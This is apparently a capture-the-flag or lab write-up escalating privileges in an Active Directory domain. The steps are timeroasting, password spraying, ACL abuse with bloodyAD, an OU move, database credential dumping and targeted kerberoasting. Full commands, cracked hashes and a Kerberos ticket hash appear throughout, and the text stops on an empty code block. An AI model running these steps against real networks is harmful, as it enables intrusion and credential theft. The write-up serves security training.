# Objective and initial access
HSM Defense is a defense contractor, and is required to have an in-depth penetration test done against their internal Domain Controller. You have been hired to perform a comprehensive penetration test and, if possible, elevate your privileges to Domain Admin to demonstrate impact.

You have been provided credentials for a low-privileged Active Directory user.

```python
Username: kelly.johnson
Password: Lordofwar
```

# Host file setup
```python
sudo nxc smb 10.1.22.99 --generate-hosts-file /etc/hosts                     
[sudo] password for kali: 
SMB         10.1.22.99      445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
```

NTLM is disabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn dc.hsm-defense.local -vv

PORT      STATE SERVICE          REASON
25/tcp    open  smtp             syn-ack
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
110/tcp   open  pop3             syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
143/tcp   open  imap             syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
587/tcp   open  submission       syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49672/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
49725/tcp open  unknown          syn-ack
```

## Nmap
```python
nmap -p 25,53,80,88,110,135,139,143,389,445,464,587,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT -Pn dc.hsm-defense.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 16:44 +0100
Nmap scan report for dc.hsm-defense.local (10.1.22.99)
Host is up (0.095s latency).
rDNS record for 10.1.22.99: DC.hsm-defense.local

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Office Careers | HSM Defense
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 15:44:28Z)
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 IMAP4rev1 completed CAPABILITY OK RIGHTS=texkA0001 IDLE ACL CHILDREN NAMESPACE SORT QUOTA
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: DC, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm-defense.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hsm-defense.local
| Not valid before: 2026-08-31T17:16:05
|_Not valid after:  2027-03-02T17:16:05
|_ssl-date: 2026-09-18T15:44:57+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2022|2012|2016 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (93%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 10 1909 - 2004 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (88%), Microsoft Windows Server 2012 Data Center (88%), Microsoft Windows 10 20H2 (87%), Microsoft Windows Server 2016 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Some interesting mail services

# SMB (445)

Ill start by trying the provided credentials

## Users
```python
nxc smb $target -u 'kelly.johnson' -p 'Lordofwar' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
kelly.johnson
HELPDESK01$
luke.harrison
ethan.mercer
aaron.pierce
nathan.reed
caleb.turner
adam.brooks
oscar.mazerath
evan.carter
dylan.foster
ryan.cole
ITOPS01$
svc_delegate
jason.caldwell
james.carter
oliver.bennett
ethan.hughes
lucas.turner
daniel.mitchell
mason.bradley
logan.shepherd
noah.prescott
aiden.fletcher
connor.bishop
zachary.holden
```

There are no kerberoastable or asreproastable users

## Shares
```python
nxc smb $target -u 'kelly.johnson' -p 'Lordofwar' -k --shares
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\kelly.johnson:Lordofwar 
SMB         dc.hsm-defense.local 445    dc               [*] Enumerated shares
SMB         dc.hsm-defense.local 445    dc               Share           Permissions     Remark
SMB         dc.hsm-defense.local 445    dc               -----           -----------     ------
SMB         dc.hsm-defense.local 445    dc               ADMIN$                          Remote Admin
SMB         dc.hsm-defense.local 445    dc               C$                              Default share
SMB         dc.hsm-defense.local 445    dc               IPC$            READ            Remote IPC
SMB         dc.hsm-defense.local 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.hsm-defense.local 445    dc               SYSVOL          READ            Logon server share
```

Just default shares

# HTTP (80)

![](Pasted%20image%2020260918165709.png)

There isnt much functionality, but there is references to job applications, and since the mail services are open i could potentially exploit this

The `careers` user does not exist, and i cannot capture a hash using responder and a malicious .odt

## Subdomains
```python
ffuf -u http://hsm-defense.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.hsm-defense.local' -ic -c -t 30 -fs 63852

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hsm-defense.local/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.hsm-defense.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 63852
________________________________________________

support                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 96ms]
```

Found a subdomain

![](Pasted%20image%2020260918171832.png)

Its taking native credentials, ill try `kelly.johnson`

![](Pasted%20image%2020260918171932.png)

Her credentials get me access to the support portal

![](Pasted%20image%2020260918172108.png)

Possible weak machine account password

# Time roasting

```python
nxc smb dc.hsm-defense.local -u 'kelly.johnson' -p 'Lordofwar' -k -M timeroast
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\kelly.johnson:Lordofwar 
TIMEROAST   dc.hsm-defense.local 445    dc               [*] Starting Timeroasting...
TIMEROAST   dc.hsm-defense.local 445    dc               1000:$sntp-ms$a0da1593719041353b6d9e992fb2d50e$1c0111e900000000000a09bd4c4f434cee57d98daab88ffee1b8428bffbfcd0aee57e664b6c09a8fee57e664b6c0d8a2
TIMEROAST   dc.hsm-defense.local 445    dc               1105:$sntp-ms$811b6e6e814a190074de4fac0b44397b$1c0111e900000000000a09bd4c4f434cee57d98dac94b380e1b8428bffbfcd0aee57e665589cbab6ee57e665589d0635
TIMEROAST   dc.hsm-defense.local 445    dc               1122:$sntp-ms$3f0fb4215eacb351b6b6910ea2e81957$1c0111e900000000000a09bd4c4f434cee57d98da98aabc0e1b8428bffbfcd0aee57e66571bba3afee57e66571bbea26
```

I have got 3 hashes

```python
hashcat timeroast.hash /usr/share/wordlists/rockyou.txt -m 31300

$sntp-ms$811b6e6e814a190074de4fac0b44397b$1c0111e900000000000a09bd4c4f434cee57d98dac94b380e1b8428bffbfcd0aee57e665589cbab6ee57e665589d0635:Password123
```

The hash cracked, this was for the RID `1105` and that matches with the helpdesk machine account

It may also be worth spraying this password against all users too

```python
nxc smb $target -u users.txt -p 'Password123' -k --continue-on-success

SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\HELPDESK01$:Password123
```

The only account compromised was the machine account

```python
nxc smb $target -u 'HELPDESK01$' -p 'Password123' -k          
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\HELPDESK01$:Password123
```

This account is now compromised!

# Enumeration of `HELPDESK01$`

![](Pasted%20image%2020260918174144.png)

This machine account has WriteOwner on the group `servicedesk`

![](Pasted%20image%2020260918174214.png)

Then this group has ForceChangePassword on three users

# Full control over the `servicedesk` group

```python
owneredit.py -action write -new-owner 'helpdesk01$' -target 'servicedesk' 'hsm-defense.local'/'helpdesk01$':'Password123' -k -no-pass -dc-host dc.hsm-defense.local
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Current owner information below
[*] - SID: S-1-5-21-1508256018-1502282808-1859300581-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=hsm-defense,DC=local
[*] OwnerSid modified successfully!
```

First ill grant ownership to myself

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k add genericAll 'CN=SERVICEDESK,CN=USERS,DC=HSM-DEFENSE,DC=LOCAL' 'helpdesk01$'
[+] helpdesk01$ has now GenericAll on CN=SERVICEDESK,CN=USERS,DC=HSM-DEFENSE,DC=LOCAL
```

I now have full control over the group

# Adding `helpdesk01$` to `servicedesk` group

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k add groupMember 'servicedesk' 'helpdesk01$'
[+] helpdesk01$ added to servicedesk
```

I can then add the machine account to the group

None of the users in this group have any outbound but one of them is part of the remote management users group

# Compromising `jason.caldwell` and `luke.harrison`

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k set password 'jason.caldwell' 'Password123'
[+] Password changed successfully!
```

Ill change the password of this user since they are part of remote management

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k set password 'luke.harrison' 'Password123'
[+] Password changed successfully!
```

Ill also change this users password since they are part of account administration group

# Evil-winrm access as `jason.caldwell`

After changing this users password, i cant seem to authenticate, then i remember back to the support portal

![](Pasted%20image%2020260918175645.png)

So i have compromise `luke.harrison` as well, looks like he can set the appropriate logon hours, which would make sense since he is part of the account administration group

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u luke.harrison -p 'Password123' -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: CN=Luke Harrison,CN=Users,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: DC=hsm-defense.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hsm-defense,DC=local
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.hsm-defense.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hsm-defense,DC=local
permission: CREATE_CHILD
```

As seen here the user `luke.harrison` can write to `jason.caldwell`

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' -p 'Password123' -k set object 'jason.caldwell' logonhours -v '////////////////////////////' --b64
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] jason.caldwell's logonHours has been updated
```

Then using bloodyAD once again as `luke.harrison` i can reset his logon hours

```python
nxc smb $target -u 'jason.caldwell' -p 'Password123' -k                              
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\jason.caldwell:Password123
```

This user is now compromised!

Then ill generate a TGT and krb5.conf file and export them both

```python
sudo nxc smb $target -u 'jason.caldwell' -p 'Password123' -k --generate-krb5-file /etc/krb5.conf
[sudo] password for kali: 
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] krb5 conf saved to: /etc/krb5.conf
SMB         dc.hsm-defense.local 445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\jason.caldwell:Password123

sudo nxc smb $target -u 'jason.caldwell' -p 'Password123' -k --generate-tgt jason.caldwell      
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\jason.caldwell:Password123 
SMB         dc.hsm-defense.local 445    dc               [+] TGT saved to: jason.caldwell.ccache
SMB         dc.hsm-defense.local 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=jason.caldwell.ccache

export KRB5_CONFIG=/etc/krb5.conf

export KRB5CCNAME=jason.caldwell.ccache
```

Now all that is exported i can log in 

```python
evil-winrm -i dc.hsm-defense.local -r hsm-defense.local          
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents>
```

I now have access to this account

# Enuemeration of MySQL

```python
*Evil-WinRM* PS C:\Program Files\MariaDB 10.6\data> type my.ini
[mysqld]
datadir=C:/Program Files/MariaDB 10.6/data
port=3306
bind-address=127.0.0.1
innodb_buffer_pool_size=511M

[client]
port=3306
plugin-dir=C:\Program Files\MariaDB 10.6/lib/plugin

[internal_app]
database_host=127.0.0.1
database_user=root
database_password=pa$$w0rd12
*Evil-WinRM* PS C:\Program Files\MariaDB 10.6\data>
```

Found a hardcoded password, looks like its to the DB

```python
evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -e "SHOW DATABASES;"
Database
hsm_defense
information_schema
mysql
new_employees
performance_schema
sys
```

Ill dump the databases

```python
evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -D 'new_employees' -e "SHOW TABLES;"
Tables_in_new_employees
employees
```

There is an employees table in this DB

```python
evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -D 'new_empl
oyees' -e "SELECT * FROM employees;"
id	username	password
1	aaron.pierce	d482a055616317f569cd1ab90325479e
2	nathan.reed	d482a055616317f569cd1ab90325479e
4	adam.brooks	f3a4f28a0aaf388c0ce16a6011acf511
evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin>
```

Found some password hashes

```python
hashcat hashes.txt /usr/share/wordlists/rockyou.txt --user -m 0

d482a055616317f569cd1ab90325479e://newpassword123
```

There were two users in the DB with the same MD5 hash and this was the one that cracked, so ill just try and spray this password against the whole domain

# Password spray leads to user compromise of two users

```python
nxc smb dc.hsm-defense.local -u users.txt -p '//newpassword123' -k --continue-on-success

SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\aaron.pierce://newpassword123
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\caleb.turner://newpassword123
```

Two users compromised!

# Enumeration of `caleb.turner`

This user looks more interesting

![](Pasted%20image%2020260921182132.png)

This user is part of some interesting groups

![](Pasted%20image%2020260921182242.png)

This user also has full control (GenericAll) over three OUs and obviously all its child nodes

If i also use bloodyAD i can see something else interesting

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u caleb.turner -p '//newpassword123' -k get writable

...[SNIP]...

distinguishedName: CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local
permission: WRITE
```

He has write on a user thats not showing up in bloodhound, and this user is part of `IT-Tier1`

The other user `aaron.pierce` doesnt really have anything interesting

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u caleb.turner -p '//newpassword123' -k get writable --detail | grep -C 70 'oscar'

distinguishedName: CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local
manager: WRITE
mail: WRITE
msDS-HABSeniorityIndex: WRITE
msDS-PhoneticDisplayName: WRITE
msDS-PhoneticCompanyName: WRITE
msDS-PhoneticDepartment: WRITE
msDS-PhoneticLastName: WRITE
msDS-PhoneticFirstName: WRITE
msDS-SourceObjectDN: WRITE
msDS-AllowedToDelegateTo: WRITE
altSecurityIdentities: WRITE
servicePrincipalName: WRITE
userPrincipalName: WRITE
legacyExchangeDN: WRITE
otherMailbox: WRITE
showInAddressBook: WRITE
systemFlags: WRITE
division: WRITE
objectGUID: WRITE
name: WRITE
displayNamePrintable: WRITE
proxyAddresses: WRITE
company: WRITE
department: WRITE
co: WRITE
dn: WRITE
initials: WRITE
givenName: WRITE
description: WRITE
title: WRITE
ou: WRITE
o: WRITE
sn: WRITE
objectCategory: WRITE
cn: WRITE
objectClass: WRITE
```

These are the attributes i can write to

Also after getting a session as `caleb.turner` i can get the user flag

# Compromising `oscar.mazerath`

So ive tried to do a targeted kerberoast attack, but there is no support the the encryption type, and i dont have the rights to change the encryption type on the user

```python
dacledit.py -dc-host dc.hsm-defense.local -target-dn 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' -action read -principal caleb.turner hsm-defense.local/caleb.turner:'//newpassword123' -k
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1508256018-1502282808-1859300581-1112)
[*]   ACE[4] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : WriteProperty (0x20)
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : RDN (bf967a0e-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : caleb.turner (S-1-5-21-1508256018-1502282808-1859300581-1112)
[*]   ACE[5] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : WriteProperty (0x20)
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Public-Information (e48d0154-bcf8-11d1-8702-00c04fb96050)
[*]     Trustee (SID)             : caleb.turner (S-1-5-21-1508256018-1502282808-1859300581-1112)
[*]   ACE[21] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadControl, Delete, ReadProperties, ListChildObjects (0x30014)
[*]     Trustee (SID)             : caleb.turner (S-1-5-21-1508256018-1502282808-1859300581-1112)
```

Ill read the DACL info, and i notice something, the user `caleb.turner` has all the rights to move the objects 

```python
nxc smb dc.hsm-defense.local -u caleb.turner -p '//newpassword123' -k --generate-tgt caleb.turner
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\caleb.turner://newpassword123 
SMB         dc.hsm-defense.local 445    dc               [+] TGT saved to: caleb.turner.ccache
SMB         dc.hsm-defense.local 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=caleb.turner.ccache
```

Ill get a TGT

```python
export KRB5CCNAME=caleb.turner.ccache
```

Ill then export it

```python
python3 ou-move.py -H ldap://dc.hsm-defense.local --kerberos --from-ou 'CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL' --to-ou 'OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL'

  ___  _   _   __  __                   
 / _ \| | | | |  \/  |                  
| | | | | | | | |\/| | _____   _____    
| |_| | |_| | | |  | |/ _ \ \ / / _ \  
 \___/ \___/  |_|  |_|\___/\ V /  __/  
                              \_/ \___|  
  OU Move Tool — LDAP moddn

[*] Connecting to dc.hsm-defense.local:389 (LDAP)
[*] Binding via Kerberos (SASL GSSAPI) using existing ticket cache...
[+] Bound via Kerberos as: u:HSMDEFENSE\caleb.turner

[*] Verifying object exists: CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL
[+] Object confirmed.

[*] Source DN   : CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL
[*] New RDN     : CN=OSCAR.MAZERATH
[*] New superior: OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL

[*] Executing moddn...
[+] Success! Object moved.
[+] New DN: CN=OSCAR.MAZERATH,OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL
```

https://github.com/ethanbauer10/OU-move/

I have now moved the object, which should now mean i have GenericAll over the object, which means i can change the user password

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u caleb.turner -p '//newpassword123' -k set password 'CN=OSCAR.MAZERATH,OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL' 'Password123!'
[+] Password changed successfully!
```

Ill then change the users password

```python
nxc smb dc.hsm-defense.local -u oscar.mazerath -p 'Password123!' -k
SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\oscar.mazerath:Password123!
```

This user is now compromised!

# Enumeration as `oscar.mazerath`

![](Pasted%20image%2020260921192617.png)

He is part of an interesting group

```
Description:

Members of this group can run approved PowerShell maintenance scripts that execute predefined scheduled tasks
```

This is the group description

![](Pasted%20image%2020260921192726.png)

This user also has GenericWrite over three users

Out of the three users `ryan.cole` looks the most interesting since he is part of remote desktop users

# Compromising `ryan.cole`

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u oscar.mazerath -p 'Password123!' -k set object 'ryan.cole' 'msDS-SupportedEncryptionTypes' -v '4'
[+] ryan.cole's msDS-SupportedEncryptionTypes has been updated
```

Ill first perform an encryption downgrade, using my genericwrite on the user

It could have already been set properly, but after trying a kerberoast attack on a previous user and failing due to encryption type i figured id just change it anyway

```python
bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u oscar.mazerath -p 'Password123!' -k set object 'ryan.cole' servicePrincipalName -v 'you/hacked'    
[+] ryan.cole's servicePrincipalName has been updated
```

The ill set the SPN

```python
nxc ldap dc.hsm-defense.local -u oscar.mazerath -p 'Password123!' -k --kerberoasting kerb.hash
LDAP        dc.hsm-defense.local 389    DC               [*] None (name:DC) (domain:hsm-defense.local) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.hsm-defense.local 389    DC               [+] hsm-defense.local\oscar.mazerath:Password123! 
LDAP        dc.hsm-defense.local 389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.hsm-defense.local 389    DC               [*] Total of records returned 2
LDAP        dc.hsm-defense.local 389    DC               [-] Principal: hsm-defense.local\oscar.mazerath - Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
LDAP        dc.hsm-defense.local 389    DC               [*] sAMAccountName: ryan.cole, memberOf: CN=Remote Desktop Users,CN=Builtin,DC=hsm-defense,DC=local, pwdLastSet: 2026-03-05 17:22:18.018015, lastLogon: 2026-09-03 20:14:10.288245
LDAP        dc.hsm-defense.local 389    DC               $krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local\ryan.cole*$a7d8558827dc2f355c887f8d0a1373c8$b145eca4144a292180186c221436c8527b9bc611696f22d6985e784ffe14a2d7e788418fe0ef3417b0d581f424f441e0b513c4a5f38d368a44e4fd1b15ca549cc37629a42eda1825ca659ad9bbaa1507629b41e8eb91d5dccfe3dc2f7a163317459319562b718b6f63d3541ae8df112a4d74102f17e05928de155a68bf52cb721549975191ceb34b050ad720fff954ff7fb311f4245ce6a31dd3fb807c0220fe3d150ecf56d230884be9a183876ea2325fcc718b73bfe3401efb98cbd37ecc31957bd3d2b69848bc11dbf8146d41bc0662293de58396cbf861272927376f6f8c78716420bdd8c10888ba694ca03714db2058987516f70c05ca5ecc0e62972752eb7f6e24b03e9f5e83565939e543a0e7679b89ca28df1a7d0f47ef315fcd28516085cd3a6e58daa703fe01587decf82458915b295575ced62c7bf5ed8d0efdb146718ce4e779061638f3c04c66f9106b7d87ea9346e83f2a18b06041435cfaeabc94f03f883afba3bdb33ca1f6a000afff219bcea1ea7e703e54a6d1f7073c227d0a529115fcd260a6d61b7ed8425ba634894c0179b37aa032f8711dcf8bf07ce9d76c16dcf3bf217a293384de9029acd11e38e808b1268f1437cf16f5e12a3d72805feaee0500516ef2515938686b6f11b6d89fdaa57a667c76e90d6c04b9b7c097379a319f4fb1960e1508b38ae7b5c8f119df6f8eabf9ebbc1b34bd02944ae2d7b4f5907cbbb5de4eb7b881732aca7df32b44ee75c440519dcaafa156b9ee62f9652b17edfb0dbe406d33e2f5240f6788a9fe00412bed22898bfb3a28729e00237349e72c9a56170ec063b74b8e7db06209cf1914a2a7c44ad2ee8d053d03ca28ed9355ee037b805d04d76a461f78e682a61f1902c8dcd53a8d1f7a82a93300eecf79ff8982845549eed4aa72ff17b2dc777ffd4c4ea1989833abcc19bdcadc20eba2373632bdb175e60318692cc5822b718d348653e15e776ef6e20b0e48d747337c80e836126bfb158e1dcf7ecd3414dc8a4e53bb9ac0cb463d377f6891db671559f3ce3e4d586132d8b5ab4226cc944e6e683b0fd293e5ab491dd50296eaded034369197cdf5d2db16d1ffbae7a61babec0fb8f8e72de31cfd45bddcdee4bd71246d7c66b6c4cbea554dd7da5975979969b4efab5146744663df0a38cfa3baac98b719d5922ad52e55a9b30408bba861645cfac62a20e8cf3498814dd3cd3b9f564676ff5162c3719ecf1e2a45c8380f1ee03895b910b018efa26c15f089c78c8fc08bdc035e644ddfd3a496776ad3c0e14bde9007ecdabf32db48079b730ef6a706f09a49c8d21f11cf61a3a793bd4fd23ff26e2b7ebcdab8ec6d95a1e479c05ac4fc985d3a1818d3fa31fba75adb1a0b138a2cc495c9d7ab5ceed589a22ecb4b2350d1358a4c267fd3a2bdc49e0c303f1463c2336af43d0c2fa178935838c63f45762333531370d51f95e3aeb4d9a5ed3b32051a75428ce21d3deea50fe82b0426cdf9c823f06e98dd773e80d2110aa9c3df474bf41906ab35082e9c28f3ed67ad1d08295cbe02b2e70302cf4eb78d3f0ab911ba1bec0ce33c9029a42539b26025b8d473a2019ac4da2cff940f4d8cad3f50d65d687fbc174d70c39
```

Ill then dump the hash

```python
